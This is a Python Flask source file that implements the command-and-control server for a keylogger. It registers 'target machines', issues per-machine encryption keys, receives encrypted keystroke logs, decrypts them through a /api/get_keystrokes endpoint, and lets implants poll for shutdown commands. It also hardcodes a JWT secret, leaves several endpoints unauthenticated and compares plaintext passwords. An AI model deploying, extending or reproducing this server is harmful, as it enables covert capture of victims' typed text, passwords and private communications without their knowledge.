from flask import Flask, request, jsonify,make_response,render_template
from flask_cors import CORS
from flask_jwt_extended import create_access_token, get_jwt_identity, jwt_required, JWTManager
import os, random,string,datetime, json,time
from ToolBox import merge_dicts,decrypt,generate_log_filename,get_date_list

app = Flask(__name__)
CORS(app,supports_credentials=True)
app.config['JWT_SECRET_KEY'] = 'q6Nj+unD<gn1*[>J+H!0hO[;rm_Xa'
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = datetime.timedelta(hours=1) 
jwt = JWTManager(app)

DATA_FOLDER = "logs"
USERS_PATH = "users.json"




@app.route('/api/upload', methods=['POST'])
def upload():
    machine_data = request.get_json()
    if not machine_data or "machine" not in machine_data or "data" not in machine_data or not isinstance(machine_data['data'], dict):
        return jsonify({"error": "Invalid payload"}), 400

    with open('data.json', 'r', encoding='utf-8') as f:
        local_data = json.load(f)

    machine_sn = machine_data["machine"].replace("/", "_").replace("..", "_")
    if machine_sn not in local_data:
        return jsonify({"error": "machine not exist"}), 400

    log_data = machine_data["data"]
    machine_path = local_data[machine_sn]['path']
    os.makedirs(machine_path, exist_ok=True)
    log_path = machine_path + '/'+generate_log_filename()
    try:
        with open(log_path, 'r', encoding='utf-8') as f:
            try:
                machine_exist_data = json.load(f)
            except json.JSONDecodeError:
                machine_exist_data = []
    except FileNotFoundError:
        machine_exist_data = []
    # machine_log = merge_dicts(machine_exist_data, log_data)
    machine_exist_data.append(log_data)
    with open(log_path, "w", encoding="utf-8") as f:
        json.dump(machine_exist_data, f, ensure_ascii=False, indent=4)

    return jsonify({"status": "success"}), 200


@app.route('/api/create_machine', methods=['POST'])
def create_machine():
    data_path = 'data.json'

    data = request.get_json()
    if not data or "ip" not in data or "host name" not in data or "mac address" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    ip = data["ip"]
    mac_address = data["mac address"]
    host_name = data["host name"]
    key = "".join(random.choices(string.ascii_letters,k=512))

    try:
        with open(data_path, 'r', encoding='utf-8') as file:
            try:
                data_dict = json.load(file)
            except json.JSONDecodeError:
                data_dict = {}
    except FileNotFoundError:
        data_dict = {}

    serial_number = int(max(data_dict.keys(), default=1000)) + 1

    data_dict[serial_number] = {'mac address': mac_address, 'host name': host_name, 'ip': ip, 'path': f'logs/machine_{serial_number}',"key":key}
    with open(data_path, 'w', encoding='utf-8') as file:
        json.dump(data_dict, file, ensure_ascii=False, indent=4)

    return jsonify({"serial_number": serial_number,"key":key}), 200


@app.route('/check_server', methods=['GET'])
def check_server():
    return jsonify({"status": "OK"}), 200

@app.route('/api/get_demo',methods = ['GET'])
@jwt_required()
def get_demo():
    data = [{"time": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8))), "window": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8))), "text": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8)))} for _ in range(random.randint(20,50))]
    return jsonify(data), 200


@app.route('/api/get_keystrokes', methods=['GET'])
@jwt_required()
def get_keystrokes():
    machine_sn = request.args.get('machine_sn')
    start_date = request.args.get('start_date')
    end_date = request.args.get('end_date')

    if not machine_sn:
        return jsonify({"error": "invalid machine serial number"}), 400
    if not start_date or not end_date:
        return jsonify({"error": "invalid date range"}), 400

    dates = get_date_list(start_date, end_date)
    try:
        with open('data.json', 'r', encoding='utf-8') as f:
            data = json.load(f)

        if machine_sn not in data:
            return jsonify({"error":f"machine {machine_sn} not found"}),400
        machine_path = data[machine_sn]['path']
        key = data[machine_sn]["key"]
        list_key_logs = []
        for cur_date in dates:
            file_path = machine_path + "/log_"+cur_date+".json"

            # if not os.path.exists(file_path):
            #     return jsonify({"error":"logs file not found"}),400

            with open(file_path, 'r',encoding='utf-8') as f:
                list_key_logs+=json.load(f)

            # except Exception as e:
            #     return jsonify({"error":"logs not found"}),400

        decrypt_data_list = [{decrypt(key,k): decrypt(key,v) for k, v in data.items()} for data in list_key_logs]
        merged_data = merge_dicts(*decrypt_data_list)
        return jsonify({"logs":merged_data}), 200

    except Exception as e:
        return jsonify({"error":str(e)}), 500


@app.route('/api/get_target_machines_list', methods=['GET'])
@jwt_required()
def get_target_machines_list():
    try:
        with open('data.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            machines = {sn: {'ip':machine_data['ip'],'name':machine_data['host name'],'active': time.time() - machine_data['last_chek'] < 15} for sn, machine_data in data.items()}
    except Exception as e:
        machines = {}

    try:
        return jsonify(machines), 200
    except Exception as e:
        return jsonify({"error": f"server error: {e}"}), 500

@app.route('/login', methods=['POST','GET'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    data = request.json
    username = data.get("username")
    password = data.get("password")
    with open(USERS_PATH,'r') as users_file:
       users = json.load(users_file)

    if username in users and users[username] == password:
       access_token = create_access_token(identity=username)
       response = make_response(jsonify({"msg": "Login successful"}))
       response.set_cookie("access_token",access_token,httponly=True,secure=False)
       return response
    return jsonify({"msg": "Invalid credentials"}), 401


@app.route('/api/shutdown_client', methods=['POST'])
def shutdown_client():

    machine_sn = request.args.get('machine_sn')
    if not machine_sn:
        return jsonify({"error": "invalid machine serial number"}), 400

    try:
        with open('data.json', 'r', encoding='utf-8') as f:
            local_data = json.load(f)

        if machine_sn not in local_data:
            return jsonify({"error": "machine not found"}), 404

        local_data[machine_sn]['shutdown_requested'] = True

        with open('data.json', 'w', encoding='utf-8') as f:
            json.dump(local_data, f, ensure_ascii=False, indent=4)

        return jsonify({"status": "success"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/check_commands/<machine_sn>', methods=['GET'])
def check_commands(machine_sn):
    try:
        with open('data.json', 'r', encoding='utf-8') as f:
            data = json.load(f)

        commands = {}
        if machine_sn in data:
            if data[machine_sn].get('shutdown_requested', False):
                commands['shutdown'] = True

            data[machine_sn]['shutdown_requested'] = False
            data[machine_sn]['last_chek'] = time.time()
            with open('data.json', 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=4)

        return jsonify({"commands": commands}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/', methods=['GET'])
def main():
    return render_template('index.html')




if __name__ == "__main__":
    app.run(port=9734, host='0.0.0.0')
